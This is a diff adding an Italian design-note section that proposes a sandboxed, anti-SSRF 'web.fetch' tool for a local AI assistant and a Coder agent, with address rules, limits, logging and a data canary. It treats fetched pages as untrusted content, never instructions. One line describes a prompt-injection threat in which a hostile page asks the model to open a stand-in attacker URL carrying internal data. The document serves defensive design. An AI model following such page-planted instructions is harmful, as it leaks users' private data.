@@ -2571,3 +2571,33 @@ Decisione registrata come D-248 in `docs/DECISIONS.md`; costruita sul ramo `task
 - **La domanda si modifica dalla Dashboard**: menu ⋯ → «Modifica la domanda», con «Salva», «Salva e aggiorna» e «Annulla»; l'etichetta resta quella che è.
 - **Grafici**: un riquadro può essere «Testo» o «Grafico»; per un grafico il modello locale scrive i dati in una forma chiusa (barre, linee o torta), il core li controlla, la pagina li disegna coi colori del tema e mostra la tabella dei dati a richiesta; se i dati non sono validi il riquadro tiene il grafico di prima e offre «Riprova».
 - Costruito sul ramo `task/d248-cruscotto` con la migrazione `0077`, poi rinumerata in `0076` per l'ordine delle unioni; registrato in D-248.
+
+---
+
+## P7 — Lettore di pagine pubbliche (D-262, proposta del 2026-10-20)
+
+**Contesto.** P7 di `docs/OPENDOTS.md` («lettore di pagine pubbliche isolato, anti-SSRF») è il primo passo verso il browser dell'agente (D-095 tappa 2), che userà le stesse protezioni di rete. L'utente il 2026-10-20 ha scelto di proporlo e costruirlo prima del browser.
+
+**Cosa esiste già** (letto il 2026-10-20):
+- `apps/core/src/link-fetch.ts` (D-154, link dell'inbox scaricati per il riassunto) fa già la parte difficile, senza librerie: solo `http`/`https` sulle porte normali, niente credenziali nell'indirizzo; nomi locali (`localhost`, `.local`, `.lan`…) e indirizzi privati rifiutati, NAT64, 6to4 e Teredo compresi; **DNS fissato** (il controllo è il `lookup` del socket, quindi un nome non può rispondere diversamente fra controllo e connessione); rimandi seguiti a mano e ricontrollati (al più 3, mai da https a http); 15 s, 2 MB, 20.000 caratteri di testo; testo estratto dall'HTML senza JavaScript. OpenDots usava Playwright senza JavaScript per lo stesso scopo: da noi non serve.
+- Nel registro degli strumenti (`packages/agents/src/tools.ts`) esistono già `web.search` e `web.fetch`, e la scheda modello `web` (solo Pubblico, solo locale), ma nessuno li esegue. Il gateway conosce già la destinazione `web` e la tratta come cloud: esce solo da un contesto fino a Interno (L1), con scanner e Rizzo.
+
+### Proposta
+
+- **Strumento `web.fetch`** per Arianna (orchestratore locale) e per gli agenti che lo hanno nella scheda: riceve un indirizzo, chiede il permesso al gateway (destinazione `web`, frammento = l'indirizzo, per ogni rimando come in D-154), scarica con `fetchLink` e restituisce titolo, sito e testo come **contenuto non fidato** (dentro `<tool_result>`, mai istruzioni), con label Pubblico (L0). Ciò che esce dal Mac è solo la richiesta di quell'indirizzo: niente cookie, niente credenziali, lo User-Agent onesto di D-154.
+- **Mai da una conversazione Privata o Segreta**: lo strumento non compare se la conversazione ha letto dati Privati o di Finanze (regola già scritta in `PRIVACY-POLICY-SPEC.md`, oggi applicata dal gateway; si aggiunge il filtro sull'elenco degli strumenti, come per le incognite).
+- **Quali indirizzi** (domanda 1, chiusa): in una conversazione Pubblica qualsiasi pagina pubblica; in una Interna solo gli indirizzi scritti dall'utente nella conversazione, perché una pagina ostile potrebbe chiedere al modello di aprire `https://sito-ostile.example/?d=<dati interni>`.
+- **Limiti:** al più 5 pagine per turno e 30 al giorno (contati negli eventi, senza indirizzi), errori in italiano già pronti (`FETCH_FAILURE_TEXT`).
+- **Traccia:** evento `web.fetch` con il solo sito e l'esito; l'indirizzo intero sta già in `gateway_log` come per ogni uscita.
+- **In chat:** il passo dello strumento come gli altri («Ho letto example.com — Listino prezzi»), con il link alla pagina.
+- **Codice condiviso con D-095 tappa 2:** lo strumento usa le funzioni di rete di `link-fetch.ts`; la tappa 2 le sposterà in un modulo comune per il proxy del contenitore.
+- **Fuori:** `web.search` (serve un motore di ricerca, cioè un servizio cloud con una chiave o lo scraping di un sito di ricerca: da decidere a parte), JavaScript, moduli e accessi, PDF.
+
+### Domande chiuse
+
+Risposte dell'utente del 2026-10-20, con le domande a opzioni.
+
+1. **Indirizzi per Arianna: «Pubbliche libere, Interne solo tuoi»** (la consigliata): in una conversazione Pubblica qualsiasi pagina pubblica, anche seguendo i link; in una Interna solo gli indirizzi scritti dall'utente nella conversazione.
+2. **Coder su Claude: «la soluzione enterprise»** (risposta libera, confermata con una seconda domanda: «scegli la soluzione enterprise»). Il Coder riceve `web.fetch` dal server MCP di Arianna (D-261, `cloud_tools`) con controlli stretti: (a) solo gli indirizzi scritti dall'utente nel brief e le pagine dei siti di un elenco tenuto dall'utente in Impostazioni (`[web] coder_sites` di `arianna.toml`, vuoto di partenza; un sottodominio vale per il suo sito); un link trovato in una pagina e fuori elenco è rifiutato; (b) ogni pagina passa dal gateway e finisce nel registro (sito, ora, esito); (c) tetto di pagine per lavoro (10) dentro i limiti già fissati del server MCP; (d) canarino dal vivo con un dato Privato finto che non deve uscire.
+
+**Stima:** 12-18 h di sessione: strumento e regole di indirizzi e limiti con test positivi e negativi in `packages/policy` e nel core (4-6 h), passo in chat (1-2 h), eval del gateway e caso `eval:models` sull'uso dello strumento (1-2 h), `web.fetch` per il Coder dal server MCP con l'elenco dei siti e il canarino (4-6 h). Nessuna dipendenza nuova. Lo spostamento del codice di rete in un modulo comune si fa con la tappa 2, quando serve al proxy.
